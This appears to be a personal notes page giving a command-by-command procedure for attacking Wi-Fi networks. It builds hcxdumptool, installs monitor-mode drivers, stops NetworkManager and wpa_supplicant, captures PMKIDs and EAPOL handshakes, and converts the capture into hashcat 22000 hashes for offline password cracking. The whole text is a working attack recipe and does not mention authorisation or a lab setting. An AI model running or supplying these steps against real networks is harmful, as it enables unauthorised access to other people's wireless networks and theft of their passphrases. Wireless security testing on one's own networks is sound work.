After getting up all the environment, OS, Antenna, etc. you have to configure the software.

1. Build the package [_Hcxdumptool._](https://github.com/ZerBea/hcxdumptool)
```
git clone https://github.com/ZerBea/hcxdumptool.git

sudo apt-get install libcurl4-OpenSSL-dev libssl-dev pkg-config

make
```

2. Install drivers with monitor mode capability. Each chipset has its drivers:
```
$ git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au.git

$ make && make install 
```

3. Shut down services that might interfere with [_Hcxdumptool_](https://github.com/ZerBea/hcxdumptool) execution:
```
$ sudo service NetworkManager stop
$ sudo service wpa_supplicant stop
```

## Starting to sniff

1. Start the attack and wait for you to receive PMKIDs and / or EAPOL message pairs, then exit hcxdumptool.
```
$ hcxdumptool -i interface -w dumpfile.pcapng -F --rds=1
```

![[Procedure-20241210150945721.webp]]

2. Restart stopped services to reactivate your network connection.
```
$ sudo service NetworkManager start
$ sudo service wpa_supplicant start
```


## Convert the traffic to hash format 22000.

 As the sniffing results are in the form of _pcapng,_ we needed to convert them into a hashfile format to fit it to _hashcat_.

```
$ hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

![[Screenshot_2024-12-10_20-27-08.png]]

